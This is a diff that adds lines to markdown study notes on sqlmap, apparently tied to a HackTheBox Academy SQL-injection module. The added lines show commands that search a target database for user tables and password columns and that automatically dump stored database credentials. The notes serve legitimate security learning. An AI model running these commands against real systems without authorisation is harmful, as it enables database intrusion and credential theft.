@@ -108,4 +108,14 @@ We can dump everything except sysdbs by using:
 We can retrieve the structure of all db using the switch
 `--schema`
 
-We can search for columns, db and tables of interest by using 
+We can search for columns, db and tables of interest by using --search option:
+```
+sqlmap -u "http://www.example.com/?id=1" --search -T user (search tables)
+sqlmap -u "http://www.example.com/?id=1" --search -C pass (search columns)
+```
+To auto dump system tables containing database specific credentials, use the following command:
+```
+sqlmap -u "http://www.example.com/?id=1" --passwords --batch
+```
+
+For other advanced usage, refer https://academy.hackthebox.com/app/module/58/section/530
